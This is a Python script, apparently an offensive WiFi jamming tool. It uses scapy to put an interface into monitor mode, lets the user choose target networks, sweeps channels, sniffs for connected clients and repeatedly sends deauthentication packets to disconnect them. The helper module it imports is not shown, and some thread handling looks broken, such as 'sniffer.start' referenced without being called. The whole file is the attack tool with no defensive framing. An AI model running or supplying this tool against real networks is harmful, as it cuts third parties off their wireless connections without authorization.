#! /usr/bin/env python3

from scapy.all import *
from threading import Thread
import time
import os
import sys
import argparse

parser = argparse.ArgumentParser(description='Jam WiFi network by sending deauth packet to client')
parser.add_argument('IFACE', help='Network Interface to use', type=str)
args = parser.parse_args()

iface = args.IFACE

from modules.networksclients import *

check_perm()
monitor('on', iface=iface)

def shutdown(iface=iface):
    monitor('off', iface)
    sys.exit(1)

try :
    ap_list = choose_from_networks(get_networks(iface=iface))
except :
    shutdown()

chan_list = get_chan_list(ap_list)
channel_sweeper = Thread(target=channel_sweep, kwargs=dict(chan_list=chan_list, iface=iface))
channel_sweeper.daemon = True
channel_sweeper.start()

sniffer = Thread(target=sniff_clients, kwargs=dict(iface=iface))
sniffer.daemon = True
sniffer.start()

sniffer.join()
try:
    while True:
        sniffer.start
        clients = get_client()
        client_list = []
        for ap in ap_list:
            client_list += ap.get_client_list(clients)
        if jam_network(client_list, iface=iface, loop=20) == 1:
            shutdown()
        sniffer.join()
except KeyboardInterrupt :
    shutdown()

shutdown()
